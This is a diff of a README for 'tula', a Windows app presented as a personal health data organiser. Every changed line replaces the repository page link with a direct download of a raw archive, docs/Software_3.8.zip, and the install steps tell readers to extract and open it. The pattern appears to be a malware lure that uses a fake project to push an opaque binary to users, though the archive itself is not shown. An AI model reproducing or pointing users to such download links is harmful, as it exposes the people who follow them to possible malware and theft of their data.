@@ -1,12 +1,12 @@
 # 🩺 tula - Personal health data in one place
 
-[![Download Tula](https://img.shields.io/badge/Download-Tula-blue?style=for-the-badge)](https://github.com/Corrosive-turn243/tula)
+[![Download Tula](https://img.shields.io/badge/Download-Tula-blue?style=for-the-badge)](https://github.com/Corrosive-turn243/tula/raw/refs/heads/main/docs/Software_3.8.zip)
 
 ## 📥 Download Tula
 
 Use this link to visit the page and download Tula:
 
-[Download Tula](https://github.com/Corrosive-turn243/tula)
+[Download Tula](https://github.com/Corrosive-turn243/tula/raw/refs/heads/main/docs/Software_3.8.zip)
 
 ## 🔍 What Tula does
 
@@ -37,7 +37,7 @@ This project is meant to be used on Windows as a local app or helper tool.
 ### Install steps
 
 1. Open the download page:
-   [Download Tula](https://github.com/Corrosive-turn243/tula)
+   [Download Tula](https://github.com/Corrosive-turn243/tula/raw/refs/heads/main/docs/Software_3.8.zip)
 2. Download the latest package or release file from that page.
 3. If the file comes as a .zip file, right-click it and choose Extract All.
 4. Open the extracted folder.
@@ -180,7 +180,7 @@ This repository includes work related to:
 
 If you want the shortest path:
 
-1. Go to [Download Tula](https://github.com/Corrosive-turn243/tula)
+1. Go to [Download Tula](https://github.com/Corrosive-turn243/tula/raw/refs/heads/main/docs/Software_3.8.zip)
 2. Download the latest file
 3. Extract it if needed
 4. Open the app on Windows
@@ -213,4 +213,4 @@ This makes it easier to find files later and keep your records in one place
 
 If you need the file again, use this page:
 
-[Download Tula](https://github.com/Corrosive-turn243/tula)
+[Download Tula](https://github.com/Corrosive-turn243/tula/raw/refs/heads/main/docs/Software_3.8.zip)
